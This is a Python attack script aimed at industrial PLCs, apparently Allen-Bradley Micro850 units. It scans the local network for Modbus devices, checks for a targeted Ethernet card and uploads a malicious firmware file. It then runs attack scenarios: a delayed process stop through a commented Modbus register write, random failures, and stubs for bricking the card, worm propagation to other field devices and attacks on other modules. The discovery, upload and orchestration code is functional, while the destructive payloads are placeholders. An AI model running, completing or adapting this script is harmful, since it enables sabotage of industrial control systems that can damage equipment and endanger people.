import socket
import struct
import subprocess
import time
import random
import logging
import os

# --- Configuration ---
PLC_IP = None  # Will be discovered dynamically
PLC_PORT = 502  # Standard Modbus port (used for detection)
ETHERNET_CARD_VENDOR_ID = "10b5"  # Example:  Replace with the actual vendor ID of the Micro850's Ethernet card. Find using OS tools (lsusb on Linux, Device Manager on Windows)
ETHERNET_CARD_PRODUCT_ID = "9120"  # Example: Replace with the actual product ID.  Find using OS tools.
FIRMWARE_FILE = "malicious_ethernet_firmware.bin"  # Path to the malicious firmware file.
UPLOAD_TOOL = "etherate" #Tool used for uploading to Ethernet card of the PLC (could be open source or commercial)
LOG_FILE = "ethernet_card_compromise.log"

# --- Logging Setup ---
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logging.info("Starting Ethernet Card Compromise Script")

# --- Helper Functions ---

def find_plc_ip_address():
    """
    Dynamically discovers the PLC's IP address by scanning the network.
    This is a very basic implementation using ICMP (ping).  More robust methods 
    involve network scanning tools (nmap) or PLC discovery protocols (e.g., Ethernet/IP).
    """
    try:
        # Get the local IP address to determine the network range
        local_hostname = socket.gethostname()
        local_ip = socket.gethostbyname(local_hostname)
        network_prefix = ".".join(local_ip.split(".")[:3]) + "."

        # Iterate through a range of IP addresses on the local network
        for i in range(1, 255):
            ip_address = network_prefix + str(i)
            try:
                # Ping each IP address to check if it's alive
                ping_command = ["ping", "-n", "1", "-w", "100", ip_address]  # Windows
                # ping_command = ["ping", "-c", "1", "-W", "0.1", ip_address] #Linux
                result = subprocess.run(ping_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                if result.returncode == 0:
                    # Check if the IP address responds to Modbus on port 502 (likely a PLC)
                    if check_modbus_connection(ip_address, PLC_PORT):
                        logging.info(f"Found PLC at IP address: {ip_address}")
                        return ip_address
            except Exception as e:
                logging.warning(f"Error during ping/Modbus check of {ip_address}: {e}")
    except Exception as e:
        logging.error(f"Error during IP address discovery: {e}")
    return None

def check_modbus_connection(ip_address, port):
    """
    Checks if a Modbus connection can be established on the given IP address and port.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Short timeout to avoid hanging
        sock.connect((ip_address, port))
        sock.close()
        return True
    except socket.error:
        return False

def check_ethernet_card_presence():
    """
    Checks for the presence of the vulnerable Ethernet card using `lsusb` (Linux) or `Get-PnpDevice` (Windows).
    Requires the correct vendor and product IDs.  Adapt the commands for other OS as needed.
    """
    try:
        if os.name == 'nt': #Windows
           # Requires PowerShell
            command = [
                "powershell",
                "-Command",
                f"Get-PnpDevice | Where-Object {{$_.VendorID -eq '{ETHERNET_CARD_VENDOR_ID}' -and $_.ProductID -eq '{ETHERNET_CARD_PRODUCT_ID}'}}"
            ]

        else: #Linux, macOS (needs `lsusb`)
            command = ["lsusb"]
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout.lower()

        if ETHERNET_CARD_VENDOR_ID.lower() in output and ETHERNET_CARD_PRODUCT_ID.lower() in output:
            logging.info("Vulnerable Ethernet card found.")
            return True
        else:
            logging.warning("Vulnerable Ethernet card not found.")
            return False

    except Exception as e:
        logging.error(f"Error checking for Ethernet card: {e}")
        return False


def upload_malicious_firmware(ip_address, firmware_file):
    """
    Uploads the malicious firmware to the Ethernet card. This part is highly dependent on the specific tool used.
    This example assumes a command-line tool called `etherate` that takes the IP and firmware file as arguments.
    """
    try:
        command = [UPLOAD_TOOL, "-ip", ip_address, "-firmware", firmware_file]
        logging.info(f"Executing firmware upload command: {' '.join(command)}")

        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode == 0:
            logging.info(f"Firmware upload successful: {result.stdout}")
            return True
        else:
            logging.error(f"Firmware upload failed: {result.stderr}")
            return False

    except FileNotFoundError:
        logging.error(f"Upload tool '{UPLOAD_TOOL}' not found.  Ensure it's installed and in the PATH.")
        return False
    except Exception as e:
        logging.error(f"Error uploading firmware: {e}")
        return False

# --- Attack Scenarios ---

def delayed_attack(ip_address, delay_seconds):
    """Stages an attack to occur after a specified delay."""
    logging.info(f"Staging delayed attack for {delay_seconds} seconds on {ip_address}")
    time.sleep(delay_seconds)
    # Implement the specific attack here.  This is placeholder code.
    logging.warning("Delayed attack: Placeholder - Implement your specific attack logic here.  Possible attack: stop PLC")
    # Example:  Attempt to write a value to a PLC register to stop the process.
    # try:
    #     # Example Modbus write (requires pymodbus or similar)
    #     # client = ModbusClient(ip_address, port=PLC_PORT)
    #     # client.write_register(0, 1) # Example: Write to register 0 to stop the process
    #     logging.info("Delayed attack executed.")
    # except Exception as e:
    #     logging.error(f"Error executing delayed attack: {e}")

def brick_ethernet_card(ip_address):
    """Attempts to 'brick' the Ethernet card by writing invalid data to its flash memory.
       This is a highly destructive action and should be used with EXTREME caution and only in a simulated environment."""
    logging.warning("Attempting to BRICK the Ethernet card.  This is HIGHLY DESTRUCTIVE.")
    # IMPORTANT:  This is just a placeholder.  Bricking requires VERY specific knowledge 
    # of the Ethernet card's architecture and flash memory layout.  A generic write will likely
    # just crash the card temporarily, not permanently brick it.

    #THIS CODE IS FOR DEMONSTRATION PURPOSES ONLY.  IT WILL NOT ACTUALLY BRICK A CARD.
    try:
        #Example:  Write a large amount of random data to the card's memory space
        #This would require specific comms channel to card, (not Modbus)
        logging.warning("Brick Attack: Placeholder - Implement your specific bricking logic here")
    except Exception as e:
        logging.error(f"Error during bricking attempt: {e}")



def random_attack_or_failure(ip_address, probability):
    """Executes an attack or causes a failure with a given probability."""
    if random.random() < probability:
        logging.warning("Random attack triggered.")
        # Implement your attack/failure logic here.
        logging.warning("Random Attack: Placeholder - Implement your specific random attack logic here")
        #Example: could call brick_ethernet_card(ip_address) or delayed_attack(ip_address, 5)
    else:
        logging.info("Random attack not triggered this time.")

def field_device_worm(ip_address):
    """Attempts to identify and compromise other field devices of the same model."""
    logging.info("Starting field device worm propagation.")
    # IMPLEMENTATION NOTE: This is a VERY complex attack.  It requires:
    # 1. Identifying other devices on the network.
    # 2. Determining if they are the same model (requires querying or fingerprinting).
    # 3. Uploading the malicious firmware to them.
    #This example is a placeholder.
    try:
        logging.warning("Field device worm propagation: Placeholder - Implement your worm propagation logic here.  This is complex.")

        #Example.  Network scan to find same type PLC by vendor id.
        #if vendor id match with Ethernet card, run upload_malicious_firmware()

    except Exception as e:
        logging.error(f"Error during field device worm propagation: {e}")


def attack_other_cards(ip_address):
    """Attempts to use the compromised Ethernet card to attack other modules in the field device (PLC)."""
    logging.info("Attempting to attack other cards in the field device.")
    # IMPLEMENTATION NOTE: This requires deep knowledge of the PLC's internal architecture
    # and communication protocols between modules.  This is highly PLC-specific.
    #This is a placeholder.
    try:
        logging.warning("Attack other cards: Placeholder - Implement your specific attack logic for other cards here.  Requires knowledge of PLC internal architecture")
    except Exception as e:
        logging.error(f"Error attacking other cards: {e}")



# --- Main ---
if __name__ == "__main__":

    # 1. Discover PLC IP Address
    PLC_IP = find_plc_ip_address()
    if PLC_IP is None:
        logging.error("Could not find PLC IP address. Exiting.")
        exit(1)
    else:
        print(f"PLC IP Address: {PLC_IP}")

    # 2. Check for the presence of the vulnerable Ethernet card
    if not check_ethernet_card_presence():
        logging.error("Vulnerable Ethernet card not found. Exiting.")
        exit(1)

    # 3. Upload the malicious firmware
    if upload_malicious_firmware(PLC_IP, FIRMWARE_FILE):
        logging.info("Malicious firmware uploaded successfully.")

        # 4. Execute an attack scenario (choose one or more)
        delayed_attack(PLC_IP, 10)  # Delay attack for 10 seconds
        #brick_ethernet_card(PLC_IP)  # WARNING: This is destructive!
        random_attack_or_failure(PLC_IP, 0.2)  # 20% chance of attack
        #field_device_worm(PLC_IP) #Propagate to same Vendor id
        #attack_other_cards(PLC_IP)


    else:
        logging.error("Firmware upload failed. Attack aborted.")

    logging.info("Script finished.")